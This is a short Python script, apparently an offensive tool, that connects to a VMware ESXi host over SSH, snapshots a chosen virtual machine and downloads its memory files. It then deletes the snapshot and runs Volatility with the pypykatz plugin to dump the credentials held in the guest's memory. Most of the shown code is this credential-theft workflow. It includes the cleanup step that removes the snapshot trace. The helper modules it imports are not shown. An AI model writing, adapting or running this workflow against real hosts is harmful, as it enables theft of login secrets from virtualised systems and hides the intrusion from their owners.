import sys, os
from ssh_utils import *
from esx_utils import *
from utils import *

if __name__ == '__main__':
  if len(sys.argv) < 5: banner()
  args = argument_parser()

  vm_name = args.vm_name
  ssh = ssh_connect(args.hostname, args.username, args.password)
  vm_id = get_vm_id(ssh, vm_name)
  snapshot_id = create_snapshot(ssh, vm_name, vm_id)
  folder = find_vm_folder(ssh, vm_name)
  vmem_file, vmsn_file = find_vm_snapshot(ssh, vm_name, folder, snapshot_id)
  get_file(ssh, vmem_file)
  get_file(ssh, vmsn_file)
  clean_snapshot(ssh, vm_name, vm_id, snapshot_id)

  vmemshort = vmem_file.split('/')[-1]
  print('[+] Dumping Secrets...')

  cmd = f'vol -f ./{vmemshort} -p ./pypykatz-volatility3 pypykatz 2>/dev/null'
  output = os.popen(cmd).readlines()
  volatility_parse(output)
